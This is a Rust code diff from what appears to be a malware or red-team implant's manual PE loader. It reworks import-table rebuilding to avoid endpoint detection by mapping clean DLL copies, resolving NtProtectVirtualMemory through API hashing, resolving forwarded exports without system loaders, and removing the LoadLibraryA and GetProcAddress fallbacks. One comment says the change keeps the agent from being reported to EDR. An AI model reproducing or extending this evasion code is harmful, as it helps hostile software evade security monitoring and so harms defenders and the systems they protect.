@@ -44,7 +44,7 @@ struct LDR_DATA_TABLE_ENTRY {
     BaseDllName: winapi::shared::ntdef::UNICODE_STRING,
 }
 
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 #[cfg(windows)]
 use std::arch::asm;
 
@@ -826,6 +826,26 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
     let mut import_desc =
         (base + import_dir_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;
 
+    // M-26 Part D: resolve NtProtectVirtualMemory once for IAT protection changes.
+    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
+        *mut winapi::ctypes::c_void,
+        *mut *mut winapi::ctypes::c_void,
+        *mut winapi::shared::basetsd::SIZE_T,
+        u32,
+        *mut u32,
+    ) -> i32;
+    let nt_protect: Option<NtProtectVirtualMemoryFn> = {
+        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+            .unwrap_or(0);
+        let nt_protect_hash = pe_resolve::hash_str(b"NtProtectVirtualMemory\0");
+        if ntdll != 0 {
+            pe_resolve::get_proc_address_by_hash(ntdll, nt_protect_hash)
+                .map(|p| std::mem::transmute::<*const (), NtProtectVirtualMemoryFn>(p as *const ()))
+        } else {
+            None
+        }
+    };
+
     while (*import_desc).Name != 0 {
         let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
         let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr)
@@ -854,28 +874,31 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
             if let Some(b) = cached {
                 b as *mut winapi::shared::minwindef::HINSTANCE__
             } else {
-                // Not yet cached — map it; map_clean_dll is re-entrant safe
-                // via the cache check at its top but we still guard depth by
-                // only doing this for known critical DLLs (bounded set).
                 match map_clean_dll(&dll_lower) {
                     Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
-                    Err(_) => {
-                        let sysroot = std::env::var("SystemRoot")
-                            .unwrap_or_else(|_| "C:\\Windows".to_string());
-                        let path = format!("{}\\System32\\{}", sysroot, dll_name);
-                        let ptr = std::ffi::CString::new(path).unwrap();
-                        winapi::um::libloaderapi::LoadLibraryA(ptr.as_ptr()) as *mut _
+                    Err(e) => {
+                        // M-26: do NOT fall back to LoadLibraryA. Skip and warn.
+                        // Unresolved IAT entries crashing on use is preferable to
+                        // running hooked code that reports the agent to EDR.
+                        tracing::warn!(
+                            "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
+                            dll_name, e
+                        );
+                        import_desc = import_desc.add(1);
+                        continue;
                     }
                 }
             }
         } else {
-            // Prefer a clean map; fall back to hookable LoadLibraryA only if the
-            // DLL is not in System32 or clean-mapping fails for another reason.
             match map_clean_dll(&dll_lower) {
                 Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
-                Err(_) => {
-                    let h = winapi::um::libloaderapi::LoadLibraryA(dll_name_ptr);
-                    h as *mut _
+                Err(e) => {
+                    tracing::warn!(
+                        "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
+                        dll_name, e
+                    );
+                    import_desc = import_desc.add(1);
+                    continue;
                 }
             }
         };
@@ -901,28 +924,44 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
             let iat_size =
                 (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA64>();
 
-            let mut old_protect = 0;
-            winapi::um::memoryapi::VirtualProtect(
-                first_thunk as *mut _,
-                iat_size,
-                winapi::um::winnt::PAGE_READWRITE,
-                &mut old_protect,
-            );
+            let mut old_protect = 0u32;
+            // M-26 Part D: prefer NtProtectVirtualMemory; fall back to VirtualProtect.
+            {
+                let mut base_ptr = first_thunk as *mut winapi::ctypes::c_void;
+                let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                if let Some(nt_p) = nt_protect {
+                    nt_p(
+                        -1isize as *mut winapi::ctypes::c_void,
+                        &mut base_ptr,
+                        &mut region_size,
+                        winapi::um::winnt::PAGE_READWRITE,
+                        &mut old_protect,
+                    );
+                } else {
+                    winapi::um::memoryapi::VirtualProtect(
+                        first_thunk as *mut _,
+                        iat_size,
+                        winapi::um::winnt::PAGE_READWRITE,
+                        &mut old_protect,
+                    );
+                }
+            }
 
             while (*original_thunk).u1.AddressOfData() != &0 {
                 let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
                 let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG64) != 0 {
                     let ordinal = (addr_of_data & 0xffff) as u16;
-                    // Resolve via clean export table instead of hookable GetProcAddress (M-24).
+                    // Resolve via clean export table instead of hookable GetProcAddress (M-24/M-26).
                     let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
                     if !addr.is_null() {
                         addr as usize
                     } else {
-                        // Fallback to GetProcAddress when clean resolution fails (e.g. no clean map).
-                        winapi::um::libloaderapi::GetProcAddress(
-                            dep_handle as *mut _,
-                            ordinal as winapi::um::winnt::LPCSTR,
-                        ) as usize
+                        // M-26: do NOT fall back to GetProcAddress. Leave the slot at 0.
+                        tracing::warn!(
+                            "rebuild_iat: ordinal {} in {} could not be resolved cleanly, leaving IAT slot unfilled",
+                            ordinal, dll_name
+                        );
+                        0
                     }
                 } else {
                     let import_by_name = (base + addr_of_data as usize)
@@ -940,12 +979,28 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 first_thunk = first_thunk.add(1);
             }
 
-            winapi::um::memoryapi::VirtualProtect(
-                first_thunk.sub(num_thunks) as *mut _,
-                iat_size,
-                old_protect,
-                &mut old_protect,
-            );
+            {
+                let restore_addr = first_thunk.sub(num_thunks) as *mut winapi::ctypes::c_void;
+                let mut base_ptr = restore_addr;
+                let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                let mut prev_protect = 0u32;
+                if let Some(nt_p) = nt_protect {
+                    nt_p(
+                        -1isize as *mut winapi::ctypes::c_void,
+                        &mut base_ptr,
+                        &mut region_size,
+                        old_protect,
+                        &mut prev_protect,
+                    );
+                } else {
+                    winapi::um::memoryapi::VirtualProtect(
+                        restore_addr as *mut _,
+                        iat_size,
+                        old_protect,
+                        &mut prev_protect,
+                    );
+                }
+            }
         }
 
         import_desc = import_desc.add(1);
@@ -990,14 +1045,54 @@ unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
 
             // Forwarded export check: if the function RVA falls within the
             // export directory itself, it points to an ASCII "DLL.FuncName"
-            // forward string — not executable code.  Skip it.
+            // forward string — not executable code.
             let export_dir_start = export_dir_rva as usize;
+            // Approximate upper bound: include name and function arrays after the dir.
             let export_dir_end = export_dir_start
+                + (*export_dir).NumberOfNames as usize * 4
                 + (*export_dir).NumberOfFunctions as usize * 4;
             if func_rva >= export_dir_start && func_rva < export_dir_end {
-                // Forwarded export — cannot resolve here without loading the
-                // target DLL.  Return 0 to indicate unresolved.
-                return 0;
+                // M-26: resolve the forwarded export recursively rather than
+                // returning 0 (which forced callers down the hooked-IAT path).
+                let forward_str_ptr = (base + func_rva) as *const i8;
+                let forward_cstr = std::ffi::CStr::from_ptr(forward_str_ptr);
+                let forward_str = match forward_cstr.to_str() {
+                    Ok(s) => s,
+                    Err(_) => return 0,
+                };
+                let (dll_part, func_part) = match forward_str.find('.') {
+                    Some(dot_pos) => (&forward_str[..dot_pos], &forward_str[dot_pos + 1..]),
+                    None => return 0,
+                };
+                let dll_name_with_ext = format!("{}.dll", dll_part);
+                let dll_lower = dll_name_with_ext.to_lowercase();
+
+                // Resolve the forward target from a clean-mapped copy.
+                let target_base = match map_clean_dll(&dll_lower) {
+                    Ok(b) => b,
+                    Err(_) => CLEAN_MODULES
+                        .get()
+                        .and_then(|m| m.lock().unwrap().get(&dll_lower).copied())
+                        .unwrap_or(0),
+                };
+                if target_base == 0 {
+                    return 0;
+                }
+
+                // "#123" → ordinal; otherwise named export.
+                if let Some(stripped) = func_part.strip_prefix('#') {
+                    if let Ok(ordinal) = stripped.parse::<u32>() {
+                        let addr = get_export_addr_by_ordinal(target_base, ordinal);
+                        return addr as usize;
+                    }
+                }
+                let mut func_name_null = func_part.as_bytes().to_vec();
+                func_name_null.push(0);
+                let target_hash = pe_resolve::hash_str(&func_name_null);
+                if let Some(addr) = pe_resolve::get_proc_address_by_hash(target_base, target_hash) {
+                    return addr;
+                }
+                return get_export_addr(target_base, func_name_null.as_ptr() as *const i8);
             }
 
             return base + func_rva;
